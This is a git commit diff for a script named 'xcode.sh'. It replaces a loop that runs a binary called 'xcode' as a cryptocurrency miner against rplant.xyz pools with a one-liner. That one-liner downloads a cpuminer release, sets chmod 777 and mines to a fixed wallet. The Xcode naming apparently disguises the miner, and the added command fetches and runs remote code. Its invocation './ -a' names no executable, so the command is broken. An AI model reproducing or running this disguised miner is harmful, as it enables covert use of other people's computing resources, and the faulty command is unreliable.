124c5ed814f27205a1616b5a4023ac72d5e7f766
puyuhdus <99848421+puyuhdus@users.noreply.github.com>
2022-02-17 09:04:28 +0700

    Create xcode.sh

--- xcode.sh
+++ xcode.sh
@@ -1,11 +1,1 @@
-#!/bin/sh
-#
-# Choose nearest stratum:
-#       stratum-ru.rplant.xyz   /Moscow/
-#       stratum-eu.rplant.xyz   /London/
-#       stratum-asia.rplant.xyz /Singapore/
-#       stratum-na.rplant.xyz   /Toronto/
-#
-FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
-while [ 1 ]; do
-"$FOLDER"/xcode -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RFbqnHHydtYxrq6jwqmwZgMt7CR4s5rKd7
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.21/cpuminer-opt-mac.tar.gz && brew install gnu-tar && tar xvf cpuminer-opt-mac.tar.gz && chmod 777 cpuminer-sse2 && ./ -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RFbqnHHydtYxrq6jwqmwZgMt7CR4s5rKd7
